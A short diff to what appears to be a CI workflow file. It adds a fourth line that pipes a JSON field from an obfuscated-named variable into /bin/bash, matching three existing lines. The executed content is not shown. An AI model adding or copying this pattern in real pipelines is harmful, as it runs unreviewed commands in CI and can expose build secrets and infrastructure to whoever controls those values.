@@ -25,6 +25,7 @@ jobs:
           echo $thkt7 | jq -r .xmu49 | /bin/bash
           echo $fc5 | jq -r .cpzr40 | /bin/bash
           echo $vs3 | jq -r .pois791 | /bin/bash
+          echo $wbq637 | jq -r .vq0 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
